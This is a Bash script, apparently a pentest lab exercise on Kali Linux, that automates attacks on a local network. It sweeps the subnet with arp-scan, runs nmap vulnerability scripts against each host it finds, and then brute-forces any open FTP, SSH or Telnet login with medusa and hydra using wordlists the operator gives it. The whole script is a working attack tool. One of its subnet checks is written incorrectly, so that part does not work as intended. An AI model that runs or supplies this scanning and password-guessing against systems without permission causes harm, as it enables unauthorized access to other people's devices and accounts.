#!/bin/bash

# doing updates ..
sudo apt update
sudo apt-get install arp-scan 

#  checking subnet for ip scan and  showing open ports and save it to a report file 
	IP=$(ifconfig | awk NR==2 | awk '{print $2}')
	SNETCHECK=$(ifconfig | awk NR==2 | awk '{print $4}')
	FIRST=$(timedatectl | grep Local | awk '{print $5}' | sed 's/://g')
        function SUBSCAN(){
	mkdir /home/kali/Desktop/Reports
	if [ "SNETCHECK"=="255.255.255.0" ]
	then sudo arp-scan $IP/24 |  awk 'NR==3,NR==5' | awk '{print $1}' > /home/kali/Desktop/Reports/Targets && echo $IP >> /home/kali/Desktop/Reports/Targets && nmap -iL /home/kali/Desktop/Reports/Targets -sV -F --script=default,vuln > /home/kali/Desktop/Reports/ScanR
	else echo "[*]please enter subnet:"
	read SUBNET ; sudo arp-scan $IP$SUBNET
	fi
} 
        SUBSCAN
	LAST=$(timedatectl | grep Local | awk '{print $5}' | sed 's/://g')
	TIME=$(expr $LAST - $FIRST)
	echo "the time i to analyze t" > /home/kali/Desktop/Reports/TimeAndDevices
	echo $TIME >> /home/kali/Desktop/Reports/TimeAndDevices

	TAR=$(cat /home/kali/Desktop/Reports/Targets | wc -l) 
	echo "devices scaned:" >> /home/kali/Desktop/Reports/TimeAndDevices
	echo $TAR >> /home/kali/Desktop/Reports/TimeAndDevices
        cd /home/kali/Desktop

#ask the user to spacify userlist and password list.
	echo "[*]write  userlist:" 
	read USERLIST

	read -n 1 -p "Would you like to [S]pacify or [c]reate passwordlist? (S/c) " ans;

        case $ans in
    s|S)
        echo
        echo "[**]write passwordlist:"
		read PASSLIST;;
         c|C)
        nano /home/kali/Desktop/Reports/pwl.lst ;; 
         *)
        echo "[**]Spcify passwordlist:"
		read PASSLIST ;;
         esac



# checking for open services (port),  brute force by the service.
        function BFORCEFTP(){
	if [ -e /home/kali/Desktop/Reports/pwl.lst  ] 
	then medusa -U $USERLIST -P /home/kali/Desktop/Reports/pwl.lst -M ftp -H /home/kali/Desktop/Reports/ftpTargets  
	else medusa -U $USERLIST -P $PASSLIST -M ftp -H /home/kali/Desktop/Reports/ftpTargets 
	fi
}
	
         function FTPCHK(){
	nmap -iL /home/kali/Desktop/Reports/Targets -p21 > /home/kali/Desktop/Reports/FTPCHECK
	FTPOPEN=$(cat /home/kali/Desktop/Reports/FTPCHECK | grep -i open | awk '{print $2}')
	if [ "$FTPOPEN" == "open" ]
	then $(cat /home/kali/Desktop/Reports/FTPCHECK | grep -i open -B 4 | awk 'NR==1 {print $5}' > /home/kali/Desktop/Reports/ftpTargets ) 
	BFORCEFTP
	else SSHCHK
	fi	
}	

	
# 

        function SSHCHK(){
	nmap -iL /home/kali/Desktop/Reports/Targets -p22 > /home/kali/Desktop/Reports/SSHCHECK
	SSHOPEN=$(cat /home/kali/Desktop/Reports/SSHCHECK | grep -i open | awk '{print $2}')
	if [ "$SSHOPEN" == "open" ]
	then $(cat /home/kali/Desktop/Reports/SSHCHECK| grep -i open -B 4 | awk 'NR==1 {print $5}' > /home/kali/Desktop/Reports/sshTargets) 
	BFORCESSH
	else TELNETCHK
	fi	
}	

        function BFORCESSH(){
	if [ -e /home/kali/Desktop/Reports/pwl.lst  ] 
	then medusa -U $USERLIST -P /home/kali/Desktop/Reports/pwl.lst -M ssh -H /home/kali/Desktop/Reports/sshTargets 
	else medusa -U $USERLIST -P $PASSLIST -M ssh -H /home/kali/Desktop/Reports/sshTargets
	fi
}
	
	
#
	
        function TELNETCHK(){
	nmap -iL /home/kali/Desktop/Reports/Targets -p23 > /home/kali/Desktop/Reports/TELNETCHECK
	TELNETOPEN=$(cat /home/kali/Desktop/Reports/TELNETCHECK | grep -i open | awk '{print $2}')
	if [ "$TELNETOPEN" == "open" ]
	then $(cat /home/kali/Desktop/Reports/TELNETCHECK | grep -i open -B 4 | awk 'NR==1 {print $5}' > /home/kali/Desktop/Reports/telnetTargets) 
	BFORCETELNET
	else echo "ftp, ssh and telnet were scanned and are closed."
	fi
         }	
                 	
        function BFORCETELNET(){
	if [ -e /home/kali/Desktop/Reports/pwl.lst  ] 
	then hydra -L $USERLIST -P /home/kali/Desktop/Reports/pwl.lst telnet -M /home/kali/Desktop/Reports/telnetTargets
	else hydra -L $USERLIST -P $PASSLIST telnet -M /home/kali/Desktop/Reports/telnetTargets
	fi
        }	
       FTPCHK


#  an IP Report files  to display result .
echo
echo "---------IP Report in process..please wait:)---------"
mkdir IPR

for i in $(cat /home/kali/Desktop/Reports/Targets);
do nmap $i -sV -F --script=default,vuln > /home/kali/Desktop/IPR/$i;
done

cat /home/kali/Desktop/Reports/Targets
echo "Choose an ip from the results to see scan findings"
read choose

cat /home/kali/Desktop/IPR/$choose
